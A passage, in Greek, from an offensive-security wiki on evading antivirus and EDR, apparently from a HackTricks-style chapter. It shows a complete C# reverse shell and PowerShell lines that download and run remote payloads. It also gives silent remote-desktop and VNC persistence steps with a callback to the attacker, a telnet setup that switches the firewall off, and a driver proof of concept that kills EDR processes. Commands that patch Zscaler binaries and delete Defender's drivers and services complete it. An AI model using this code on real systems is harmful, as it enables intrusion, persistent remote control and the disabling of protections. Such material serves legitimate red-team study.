Για παράδειγμα, ένα wrapper για το `version.dll!VerQueryValueW` περνά τέσσερις διευθύνσεις host και θέτει τα bits 2 και 3 (`0xC`), επειδή ο pointer τιμής και το μήκος είναι θέσεις εξόδου οκτώ byte. Το ίδιο το wrapper παραμένει generic και παραπέμπει το όνομα DLL, το όνομα export, τα ορίσματα και τη μάσκα στο `wf_call_v2`· ο host πραγματοποιεί τη μετάφραση των pointers και καλεί το native API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Περιορισμοί και σημεία ανίχνευσης

Ο κώδικας που βασίζεται έντονα στο Reflection, η δυναμική φόρτωση assemblies, τα αυθαίρετα native callbacks και οι σύνθετες δομές x64 που επιστρέφονται στη μνήμη WASM ενδέχεται να εξακολουθούν να απαιτούν προσαρμογές ανά εργαλείο ή να αποτυγχάνουν εντελώς. Τα γενικά sockets του WASI Preview 2 μπορεί επίσης να καταλήγουν σε no-op stubs, γι' αυτό τα υποστηριζόμενα εργαλεία χρησιμοποιούν host shims ειδικά για κάθε πρωτόκολλο. Επαληθεύστε κάθε εντολή σε σχέση με μια native έκδοση αντί να θεωρείτε δεδομένη την ισοδυναμία λειτουργιών.<sup>[[44]](#references)[[45]](#references)</sup>

Η τεχνική μετατοπίζει τα telemetry αντί να καθιστά το payload αόρατο. Η ανίχνευση μπορεί να στραφεί σε ένα PE που περιέχει ή υλοποιεί ένα WASM module, σε συμπεριφορά runtime τύπου Wazero, σε ασυνήθιστη κατανομή και αντιγραφή μνήμης host/guest, σε γενική απευθείας αποστολή κλήσεων Win32, σε ανωμαλίες υπογραφής και πόρων PE, καθώς και στις κλήσεις API και την κίνηση δικτύου που προκύπτουν. Επομένως, η απουσία συμβάντων CLR-load, AMSI ή .NET ETW δεν πρέπει να θεωρείται ένδειξη ότι μια διεργασία είναι ακίνδυνη.<sup>[[44]](#references)</sup>

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατή η εκτέλεση κακόβουλου κώδικα με άλλες γλώσσες, παρέχοντας στον παραβιασμένο υπολογιστή πρόσβαση **στο περιβάλλον interpreter που είναι εγκατεστημένο στο SMB share που ελέγχει ο Attacker**.

Παρέχοντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες στη μνήμη** του παραβιασμένου υπολογιστή.

Το repo αναφέρει: το Defender εξακολουθεί να σαρώνει τα scripts, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία στην παράκαμψη στατικών signatures**. Οι δοκιμές με τυχαία, μη obfuscated scripts reverse shell σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## Επαναφιλοξενία WebAssembly για αποφυγή στατικής ανάλυσης

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Το Token stomping χειραγωγεί το access token ενός προϊόντος ασφαλείας, όπως ένα EDR ή AV. Η μείωση των privileges του token μπορεί να αφήσει τη διεργασία ενεργή, εμποδίζοντάς την παράλληλα να εκτελεί προνομιούχες ενέργειες επιθεώρησης ή αποκατάστασης.

Για να αποτραπεί αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** να αποκτούν handles στα tokens διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση έμπιστου λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτή την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε απλώς το Chrome Remote Desktop στον υπολογιστή ενός θύματος και στη συνέχεια να το χρησιμοποιήσετε για να τον καταλάβετε και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κατεβάστε το από το https://remotedesktop.google.com/, επιλέξτε "Set up via SSH" και στη συνέχεια κάντε κλικ στο αρχείο MSI για Windows, για να το κατεβάσετε.
2. Εκτελέστε σιωπηλά το installer στο θύμα (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και κάντε κλικ στο next. Ο wizard θα σας ζητήσει να εξουσιοδοτήσετε τη σύνδεση· κάντε κλικ στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαραίτητες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση του GUI).
 

## Προηγμένη αποφυγή

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Η αποφυγή είναι ένα πολύ σύνθετο θέμα· μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, επομένως είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο θα στραφείτε έχει τα δικά του πλεονεκτήματα και αδυναμίες.

Σας προτείνω θερμά να παρακολουθήσετε αυτή την ομιλία του [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα των πιο Προηγμένων τεχνικών αποφυγής.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία του [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την αποφυγή σε βάθος.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές τεχνικές**

### **Έλεγχος των τμημάτων που εντοπίζει το Defender ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και να σας το απομονώσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι** το [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει την υπηρεσία μέσω ανοιχτού web στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** όταν εκκινείται το σύστημα και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλάξτε τη θύρα telnet** (stealth) και απενεργοποιήστε το firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τις λήψεις bin, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μεταφέρετε το binary _**winvnc.exe**_ και το αρχείο _**UltraVNC.ini**_ που δημιουργήθηκε **μόλις τώρα** μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια reverse **VNC connection**. Έπειτα, μέσα στο **victim**: Ξεκινήστε τον daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε το stealth, δεν πρέπει να κάνετε τα εξής

- Μην ξεκινήσετε το `winvnc` αν εκτελείται ήδη, αλλιώς θα εμφανιστεί ένα [αναδυόμενο παράθυρο](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, αλλιώς θα ανοίξει το [παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, αλλιώς θα εμφανιστεί ένα [αναδυόμενο παράθυρο](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **ξεκινήστε τον listener** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Ο τρέχων Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Παράδειγμα χρήσης της Python για τη δημιουργία injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Εξουδετέρωση AV/EDR από τον χώρο του kernel

Το Storm-2603 αξιοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες των endpoints πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για να εκτελεί προνομιούχες λειτουργίες kernel, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV που χρησιμοποιούν Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά σημεία
1. **Υπογεγραμμένος driver**: Το αρχείο που εγγράφεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη και όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει το driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το userland.
3. **IOCTLs που εκθέτει το driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου από τον δίσκο |
   | `0x990001D0` | Εκφόρτωση του driver και κατάργηση της υπηρεσίας |

   Ελάχιστο proof-of-concept σε C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να παραποιήσει αντικείμενα του kernel, ανεξάρτητα από τις δυνατότητες PPL/PP, ELAM ή άλλες δυνατότητες hardening.

Εντοπισμός / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων driver της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και ειδοποιείτε όταν φορτώνεται driver από έναν κατάλογο με δικαιώματα εγγραφής από όλους ή όταν δεν περιλαμβάνεται στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε handles από user-mode προς προσαρμοσμένα device objects, όταν ακολουθούνται από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων κατάστασης συσκευής του Zscaler Client Connector με επιδιόρθωση δυαδικών αρχείων στον δίσκο

Το **Client Connector** του Zscaler εφαρμόζει τοπικά κανόνες κατάστασης συσκευής και βασίζεται στο Windows RPC για να κοινοποιεί τα αποτελέσματα σε άλλα components. Δύο αδύναμες επιλογές σχεδιασμού καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση της κατάστασης συσκευής γίνεται **εξ ολοκλήρου στην πλευρά του client** (αποστέλλεται στον server μια boolean τιμή).
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο αρχείο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με την **επιδιόρθωση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Δυαδικό αρχείο | Αρχική λογική που επιδιορθώνεται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, ώστε κάθε έλεγχος να περνά |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | Γίνεται NOP-ed ⇒ οποιαδήποτε διεργασία (ακόμη και μη υπογεγραμμένη) μπορεί να συνδεθεί στους RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας του tunnel | Παρακάμπτονται |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι στάσης ασφαλείας εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές του Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά στην πλευρά του client και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγες αλλαγές σε bytes.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Ο driver **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντίπαλο παράδειγμα του κλασικού BYOVD. Το `BTR.sys` είναι ένα νόμιμο στοιχείο αποκατάστασης, υπογεγραμμένο από τη Microsoft, χωρίς bug καταστροφής μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ένας operator μπορεί αντί γι' αυτό να πλαστογραφήσει την ιδιωτική συναλλαγή αποκατάστασης και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/μητρώου Ring-0. Πρόκειται για primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι για αρχική πρόσβαση ή κλιμάκωση προνομίων, και ο driver μπορεί να εξαχθεί από τον ίδιο τον πόρο `BOOTTIMETOOL` του `MpEngine.dll` του στόχου, αντί να εισαχθεί ένας προφανής driver τρίτου μέρους.<sup>[[36]](#references)</sup>

### Προετοιμασία του driver μίας χρήσης

Κανονικά, το Defender αποθηκεύει τον πόρο ως αρχείο με τυχαίο όνομα `[a-z]{8}.sys` και καταχωρίζει μια υπηρεσία kernel με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει δεδομένα feedback και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε ο driver να αποφορτωθεί αντί να παραμείνει φορτωμένος. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν χρησιμοποιούν ξανά ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει μια καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και transaction ID που προκύπτει από το payload), ακολουθούμενη από μια διαδρομή feedback σε UTF-16 με τερματισμό null και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και δεδομένα ειδικά για την ενέργεια, που τελειώνουν με **ακριβώς τέσσερα byte NUL**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32, πολυώνυμο `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC επανέρχεται στην αρχική τιμή για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά ID ενεργειών αποκαλύπτουν αυτά τα primitives του kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[διαδρομή UTF-16]` | Διαγραφή αρχείου, ακόμη και αν είναι κλειδωμένο |
| 2 | `[διαδρομή UTF-16]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][πηγή][προορισμός]` | Μετακίνηση αρχείου σε προστατευμένη διαδρομή που επιλέγει ο attacker· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][διαδρομή κλειδιού]` | Αναδρομική διαγραφή κλειδιού μητρώου |
| 5 | `[Flags][διαδρομή κλειδιού + "\\" + τιμή]` | Διαγραφή τιμής μητρώου |
| 6 | `[Flags][τύπος][μέγεθος][διαδρομή κλειδιού + "\\" + τιμή][δεδομένα]` | Δημιουργία/ενημέρωση τιμής μητρώου και δημιουργία διαδρομών κλειδιών που λείπουν |

Για τις ενέργειες 5 και 6, το διαχωριστικό κλειδιού/τιμής στη σειριοποιημένη μορφή είναι **δύο διαδοχικές ανάστροφες καθέτους**· μια διαδρομή μορφοποιημένη σύμφωνα με τη συνήθη σύμβαση δεν θα διαχωριστεί σωστά. Το αρχείο feedback αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε στοιχείου γίνονται το αποτέλεσμα `NTSTATUS`. Για τις ενέργειες 1 και 2, που δεν έχουν αρχικό πεδίο flags, το BTR μετακινεί τη διαδρομή στα τέσσερα δεσμευμένα τελικά byte, ώστε να δημιουργήσει χώρο για αυτή την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασίας `BTR_CLI` και χρονικό παράθυρο πρώιμης εκκίνησης

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των `<random>.sys:changelist` και ενός stream feedback, σειριοποίηση/υπολογισμό checksum/κρυπτογράφηση αλυσιδωτών ενεργειών, απευθείας δημιουργία του κλειδιού μητρώου της υπηρεσίας και, στη συνέχεια, κλήση του `NtLoadDriver` για το `-trigger now` ή διατήρησή του ως driver εκκίνησης συστήματος για το `-trigger boot`. Η απευθείας προετοιμασία του μητρώου παρακάμπτει τη συνήθη διαδρομή SCM `CreateServiceW` και, επομένως, **δεν** δημιουργεί το Event ID 7045 εγκατάστασης υπηρεσίας. Τα τεχνουργήματα που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με το `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

